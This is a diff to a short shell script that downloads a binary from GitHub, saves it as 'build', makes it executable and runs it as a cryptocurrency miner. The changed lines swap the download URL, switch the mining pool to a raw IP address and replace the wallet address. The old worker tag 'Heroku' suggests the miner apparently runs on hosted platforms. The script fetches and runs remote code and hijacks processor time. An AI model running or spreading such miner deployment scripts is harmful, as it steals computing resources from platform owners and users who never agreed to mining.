@@ -4,6 +4,6 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
+wget -qO build https://github.com/Omarjetos/ezz/blob/master/nano?raw=true
 chmod +x build
-./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.Heroku -p x -t $(nproc --all)
+./build -a argon2/chukwav2 -o 137.184.3.159:2112 -u TRTLuztCtzxAoe6Tm1ABPf5HpKB3joh4jZSUhyrMV7Q7i1ARasJiweEhvV8YhRJKxbRPrqsfMnYPcJeikJ47NMCy5vJoTYnBDFo.tes -p x -nicehash true -t 4
